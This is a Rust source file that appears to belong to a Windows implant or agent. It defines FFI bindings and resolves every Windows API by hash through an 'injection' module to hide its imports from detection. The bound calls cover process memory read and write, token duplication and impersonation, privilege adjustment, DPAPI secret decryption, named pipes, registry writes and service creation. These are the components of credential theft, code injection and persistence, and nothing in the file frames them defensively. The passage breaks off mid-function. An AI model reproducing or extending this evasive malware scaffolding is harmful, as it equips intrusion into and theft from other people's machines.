// src/agent/scripting/win_ffi.rs
//
// Windows FFI types, constants, and extern linkage declarations used across
// the scripting sub-modules. Import with:
//
//   #[cfg(target_os = "windows")]
//   use super::win_ffi::win_ext::*;

#[cfg(target_os = "windows")]
pub mod win_ext {
    use std::ffi::c_void;

    // ── Type aliases ─────────────────────────────────────────────────────────
    pub type HANDLE = *mut c_void;
    pub type BOOL   = i32;
    pub type DWORD  = u32;

    // ── Constants ─────────────────────────────────────────────────────────────
    // All values are OS-fixed (winnt.h). The subset mirrored by
    // config().ffi_windows (PROCESS_ALL_ACCESS, TOKEN_QUERY, MEM_COMMIT,
    // PAGE_NOACCESS) is read from the typed config at runtime call sites;
    // these declarations remain as the canonical compile-time reference.
    pub const PROCESS_ALL_ACCESS:           DWORD = 0x001F0FFF;
    pub const TOKEN_ALL_ACCESS:             DWORD = 0x000F01FF;
    pub const TOKEN_DUPLICATE:              DWORD = 0x0002;
    pub const TOKEN_IMPERSONATE:            DWORD = 0x0004;
    pub const TOKEN_QUERY:                  DWORD = 0x0008;
    pub const TOKEN_ADJUST_PRIVS:           DWORD = 0x0020;
    pub const SE_PRIVILEGE_ENABLED:         DWORD = 0x00000002;
    pub const SECURITY_IMPERSONATION: u32         = 2;
    pub const TOKEN_TYPE_IMPERSONATION: u32       = 2;
    pub const MEM_COMMIT:                   DWORD = 0x1000;
    pub const PAGE_NOACCESS:                DWORD = 0x01;
    pub const PIPE_ACCESS_DUPLEX:           DWORD = 0x00000003;
    pub const PIPE_TYPE_BYTE:               DWORD = 0x00000000;
    pub const PIPE_UNLIMITED_INSTANCES:     DWORD = 255;
    pub const GENERIC_READ:                 DWORD = 0x80000000;
    pub const GENERIC_WRITE:                DWORD = 0x40000000;
    pub const OPEN_EXISTING:                DWORD = 3;
    pub const FILE_ATTRIBUTE_NORMAL:        DWORD = 0x80;
    pub const INVALID_HANDLE_VALUE:         HANDLE = -1isize as HANDLE;

    // ── Structs ───────────────────────────────────────────────────────────────

    #[repr(C)]
    pub struct MemoryBasicInformation {
        pub base_address:       *mut c_void,
        pub allocation_base:    *mut c_void,
        pub allocation_protect: DWORD,
        pub region_size:        usize,
        pub state:              DWORD,
        pub protect:            DWORD,
        pub mem_type:           DWORD,
    }

    #[repr(C)]
    pub struct DataBlob {
        pub cb: DWORD,
        pub pb: *mut u8,
    }

    #[repr(C)]
    pub struct Luid {
        pub low:  DWORD,
        pub high: i32,
    }

    #[repr(C)]
    pub struct LuidAndAttribs {
        pub luid:  Luid,
        pub attrs: DWORD,
    }

    #[repr(C)]
    pub struct TokenPrivileges {
        pub count:      DWORD,
        // ANYSIZE_ARRAY (1) - type-level size fixed by the winnt.h ABI.
        pub privileges: [LuidAndAttribs; 1],
    }

    // ── kernel32 ─────────────────────────────────────────────────────────────

    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn GetCurrentProcess() -> HANDLE {
        type F = unsafe extern "system" fn() -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetCurrentProcess")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f() }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn GetCurrentProcessId() -> DWORD {
        type F = unsafe extern "system" fn() -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetCurrentProcessId")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f() }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn TerminateProcess(h: HANDLE, code: DWORD) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, DWORD) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"TerminateProcess")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h, code) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn OpenProcess(access: DWORD, inherit: BOOL, pid: DWORD) -> HANDLE {
        type F = unsafe extern "system" fn(DWORD, BOOL, DWORD) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenProcess")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(access, inherit, pid) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn CloseHandle(h: HANDLE) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn GetLastError() -> DWORD {
        type F = unsafe extern "system" fn() -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetLastError")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f() }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn ReadProcessMemory( h: HANDLE, base: *const c_void, buf: *mut c_void, n: usize, read: *mut usize, ) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ReadProcessMemory")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h, base, buf, n, read) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn WriteProcessMemory( h: HANDLE, base: *mut c_void, buf: *const c_void, n: usize, written: *mut usize, ) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, *mut c_void, *const c_void, usize, *mut usize) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WriteProcessMemory")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h, base, buf, n, written) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn VirtualQueryEx( h: HANDLE, addr: *const c_void, info: *mut MemoryBasicInformation, len: usize, ) -> usize {
        type F = unsafe extern "system" fn(HANDLE, *const c_void, *mut MemoryBasicInformation, usize) -> usize;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualQueryEx")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h, addr, info, len) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn CreateNamedPipeA( name: *const i8, open_mode: DWORD, pipe_mode: DWORD, max_instances: DWORD, out_buf: DWORD, in_buf: DWORD, timeout: DWORD, sa: *mut c_void, ) -> HANDLE {
        type F = unsafe extern "system" fn(*const i8, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, *mut c_void) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateNamedPipeA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(name, open_mode, pipe_mode, max_instances, out_buf, in_buf, timeout, sa) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn ConnectNamedPipe(h: HANDLE, overlapped: *mut c_void) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, *mut c_void) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ConnectNamedPipe")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h, overlapped) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn DisconnectNamedPipe(h: HANDLE) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DisconnectNamedPipe")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn ReadFile( h: HANDLE, buf: *mut c_void, to_read: DWORD, read: *mut DWORD, overlapped: *mut c_void, ) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, *mut c_void, DWORD, *mut DWORD, *mut c_void) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ReadFile")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h, buf, to_read, read, overlapped) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn WriteFile( h: HANDLE, buf: *const c_void, to_write: DWORD, written: *mut DWORD, overlapped: *mut c_void, ) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, *const c_void, DWORD, *mut DWORD, *mut c_void) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WriteFile")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h, buf, to_write, written, overlapped) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn CreateFileA( name: *const i8, access: DWORD, share: DWORD, sa: *mut c_void, creation: DWORD, flags: DWORD, tmpl: HANDLE, ) -> HANDLE {
        type F = unsafe extern "system" fn(*const i8, DWORD, DWORD, *mut c_void, DWORD, DWORD, HANDLE) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateFileA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(name, access, share, sa, creation, flags, tmpl) }
    }

    // ── advapi32 ─────────────────────────────────────────────────────────────

    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn OpenProcessToken( h: HANDLE, access: DWORD, token: *mut HANDLE, ) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, DWORD, *mut HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenProcessToken")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h, access, token) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn DuplicateTokenEx( existing: HANDLE, access: DWORD, attrs: *mut c_void, impersonation: u32, tok_type: u32, new_tok: *mut HANDLE, ) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, DWORD, *mut c_void, u32, u32, *mut HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DuplicateTokenEx")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(existing, access, attrs, impersonation, tok_type, new_tok) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn ImpersonateLoggedOnUser(token: HANDLE) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ImpersonateLoggedOnUser")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(token) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn LookupPrivilegeValueA( sys: *const i8, name: *const i8, luid: *mut Luid, ) -> BOOL {
        type F = unsafe extern "system" fn(*const i8, *const i8, *mut Luid) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LookupPrivilegeValueA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(sys, name, luid) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn AdjustTokenPrivileges( tok: HANDLE, disable_all: BOOL, new_state: *const TokenPrivileges, buf_len: DWORD, prev: *mut TokenPrivileges, ret_len: *mut DWORD, ) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, BOOL, *const TokenPrivileges, DWORD, *mut TokenPrivileges, *mut DWORD) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"AdjustTokenPrivileges")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(tok, disable_all, new_state, buf_len, prev, ret_len) }
    }
    /// Lazily resolved from shell32.dll by name hash (import-table hygiene).
    pub unsafe fn IsUserAnAdmin() -> BOOL {
        type F = unsafe extern "system" fn() -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"shell32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"IsUserAnAdmin")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f() }
    }

    // ── crypt32 ───────────────────────────────────────────────────────────────

    /// Lazily resolved from crypt32.dll by name hash (import-table hygiene).
    pub unsafe fn CryptUnprotectData( data_in:  *const DataBlob, desc:     *mut *mut u16, entropy:  *const DataBlob, reserved: *mut c_void, prompt:   *mut c_void, flags:    DWORD, data_out: *mut DataBlob, ) -> BOOL {
        type F = unsafe extern "system" fn(*const DataBlob, *mut *mut u16, *const DataBlob, *mut c_void, *mut c_void, DWORD, *mut DataBlob) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"crypt32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CryptUnprotectData")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(data_in, desc, entropy, reserved, prompt, flags, data_out) }
    }

    // ── kernel32 (LocalFree - needed after CryptUnprotectData) ───────────────

    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    pub unsafe fn LocalFree(mem: *mut c_void) -> *mut c_void {
        type F = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LocalFree")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(mem) }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Windows Registry FFI (advapi32)
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod reg_ext {
    use std::ffi::c_void;
    pub type HKEY  = *mut c_void;
    pub type DWORD = u32;
    pub type BOOL  = i32;

    pub const HKEY_CLASSES_ROOT:   HKEY = 0x80000000u32 as isize as HKEY;
    pub const HKEY_CURRENT_USER:   HKEY = 0x80000001u32 as isize as HKEY;
    pub const HKEY_LOCAL_MACHINE:  HKEY = 0x80000002u32 as isize as HKEY;
    pub const HKEY_USERS:          HKEY = 0x80000003u32 as isize as HKEY;
    pub const KEY_READ:            DWORD = 0x20019;
    pub const KEY_WRITE:           DWORD = 0x20006;
    pub const KEY_ALL_ACCESS:      DWORD = 0xF003F;
    pub const REG_SZ:              DWORD = 1;
    pub const REG_EXPAND_SZ:       DWORD = 2;
    pub const REG_BINARY:          DWORD = 3;
    pub const REG_DWORD:           DWORD = 4;
    pub const REG_QWORD:           DWORD = 11;
    pub const ERROR_SUCCESS:       DWORD = 0;
    pub const ERROR_NO_MORE_ITEMS: DWORD = 259;
    pub const REG_OPTION_NON_VOLATILE: DWORD = 0;

    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegOpenKeyExA(hKey: HKEY, lpSubKey: *const i8, ulOptions: DWORD, samDesired: DWORD, phkResult: *mut HKEY) -> DWORD {
        type F = unsafe extern "system" fn(HKEY, *const i8, DWORD, DWORD, *mut HKEY) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegOpenKeyExA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey, lpSubKey, ulOptions, samDesired, phkResult) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegCreateKeyExA(hKey: HKEY, lpSubKey: *const i8, Reserved: DWORD, lpClass: *mut i8, dwOptions: DWORD, samDesired: DWORD, lpSA: *mut c_void, phkResult: *mut HKEY, lpdwDisposition: *mut DWORD) -> DWORD {
        type F = unsafe extern "system" fn(HKEY, *const i8, DWORD, *mut i8, DWORD, DWORD, *mut c_void, *mut HKEY, *mut DWORD) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegCreateKeyExA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSA, phkResult, lpdwDisposition) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegQueryValueExA(hKey: HKEY, lpValueName: *const i8, lpReserved: *mut DWORD, lpType: *mut DWORD, lpData: *mut u8, lpcbData: *mut DWORD) -> DWORD {
        type F = unsafe extern "system" fn(HKEY, *const i8, *mut DWORD, *mut DWORD, *mut u8, *mut DWORD) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegQueryValueExA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegSetValueExA(hKey: HKEY, lpValueName: *const i8, Reserved: DWORD, dwType: DWORD, lpData: *const u8, cbData: DWORD) -> DWORD {
        type F = unsafe extern "system" fn(HKEY, *const i8, DWORD, DWORD, *const u8, DWORD) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegSetValueExA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey, lpValueName, Reserved, dwType, lpData, cbData) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegDeleteValueA(hKey: HKEY, lpValueName: *const i8) -> DWORD {
        type F = unsafe extern "system" fn(HKEY, *const i8) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegDeleteValueA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey, lpValueName) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegDeleteKeyA(hKey: HKEY, lpSubKey: *const i8) -> DWORD {
        type F = unsafe extern "system" fn(HKEY, *const i8) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegDeleteKeyA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey, lpSubKey) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegEnumKeyExA(hKey: HKEY, dwIndex: DWORD, lpName: *mut i8, lpcchName: *mut DWORD, lpReserved: *mut DWORD, lpClass: *mut i8, lpcchClass: *mut DWORD, lpftLastWriteTime: *mut u64) -> DWORD {
        type F = unsafe extern "system" fn(HKEY, DWORD, *mut i8, *mut DWORD, *mut DWORD, *mut i8, *mut DWORD, *mut u64) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegEnumKeyExA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey, dwIndex, lpName, lpcchName, lpReserved, lpClass, lpcchClass, lpftLastWriteTime) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegEnumValueA(hKey: HKEY, dwIndex: DWORD, lpValueName: *mut i8, lpcchValueName: *mut DWORD, lpReserved: *mut DWORD, lpType: *mut DWORD, lpData: *mut u8, lpcbData: *mut DWORD) -> DWORD {
        type F = unsafe extern "system" fn(HKEY, DWORD, *mut i8, *mut DWORD, *mut DWORD, *mut DWORD, *mut u8, *mut DWORD) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegEnumValueA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn RegCloseKey(hKey: HKEY) -> DWORD {
        type F = unsafe extern "system" fn(HKEY) -> DWORD;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegCloseKey")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hKey) }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Windows Services FFI (advapi32)
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod svc_ext {
    use std::ffi::c_void;
    pub type HANDLE = *mut c_void;
    pub type DWORD  = u32;
    pub type BOOL   = i32;

    pub const SC_MANAGER_ALL_ACCESS:     DWORD = 0xF003F;
    pub const SERVICE_ALL_ACCESS:        DWORD = 0xF01FF;
    pub const SERVICE_WIN32_OWN_PROCESS: DWORD = 0x10;
    pub const SERVICE_AUTO_START:        DWORD = 0x02;
    pub const SERVICE_DEMAND_START:      DWORD = 0x03;
    pub const SERVICE_ERROR_NORMAL:      DWORD = 0x01;
    pub const SERVICE_STATE_ALL:         DWORD = 0x03;
    pub const SC_ENUM_PROCESS_INFO:      u32   = 0;
    pub const SERVICE_WIN32:             DWORD = 0x30;
    pub const SERVICE_CONTROL_STOP:      DWORD = 0x01;

    #[repr(C)]
    pub struct ServiceStatusProcess {
        pub dw_service_type:              DWORD,
        pub dw_current_state:             DWORD,
        pub dw_controls_accepted:         DWORD,
        pub dw_win32_exit_code:           DWORD,
        pub dw_service_specific_exit:     DWORD,
        pub dw_check_point:               DWORD,
        pub dw_wait_hint:                 DWORD,
        pub dw_process_id:                DWORD,
        pub dw_service_flags:             DWORD,
    }

    #[repr(C)]
    pub struct ServiceStatus {
        pub dw_service_type:          DWORD,
        pub dw_current_state:         DWORD,
        pub dw_controls_accepted:     DWORD,
        pub dw_win32_exit_code:       DWORD,
        pub dw_service_specific_exit: DWORD,
        pub dw_check_point:           DWORD,
        pub dw_wait_hint:             DWORD,
    }

    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn OpenSCManagerA(lpMachineName: *const i8, lpDatabaseName: *const i8, dwDesiredAccess: DWORD) -> HANDLE {
        type F = unsafe extern "system" fn(*const i8, *const i8, DWORD) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenSCManagerA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(lpMachineName, lpDatabaseName, dwDesiredAccess) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn CloseServiceHandle(hSCObject: HANDLE) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseServiceHandle")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hSCObject) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn EnumServicesStatusExA(hSCManager: HANDLE, InfoLevel: u32, dwServiceType: DWORD, dwServiceState: DWORD, lpServices: *mut u8, cbBufSize: DWORD, pcbBytesNeeded: *mut DWORD, lpServicesReturned: *mut DWORD, lpResumeHandle: *mut DWORD, pszGroupName: *const i8) -> BOOL {
        type F = unsafe extern "system" fn(HANDLE, u32, DWORD, DWORD, *mut u8, DWORD, *mut DWORD, *mut DWORD, *mut DWORD, *const i8) -> BOOL;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"EnumServicesStatusExA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hSCManager, InfoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, pcbBytesNeeded, lpServicesReturned, lpResumeHandle, pszGroupName) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn OpenServiceA(hSCManager: HANDLE, lpServiceName: *const i8, dwDesiredAccess: DWORD) -> HANDLE {
        type F = unsafe extern "system" fn(HANDLE, *const i8, DWORD) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenServiceA")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(hSCManager, lpServiceName, dwDesiredAccess) }
    }
    /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
    pub unsafe fn CreateServiceA(hSCManager: HANDLE, lpServiceName: *const i8, lpDisplayName: *const i8, dwDesiredAccess: DWORD, dwServiceType: DWORD, dwStartType: DWORD, dwErrorControl: DWORD, lpBinaryPathName: *const i8, lpLoadOrderGroup: *const i8, lpdwTagId: *mut DWORD, lpDependencies: *const i8, lpServiceStartName: *const i8, lpPassword: *const i8) -> HANDLE {
        type F = unsafe extern "system" fn(HANDLE, *const i8, *const i8, DWORD, DWORD, DWORD, DWORD, *const i8, *const i8, *mut DWORD, *const i8, *const i8, *const i8) -> HANDLE;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
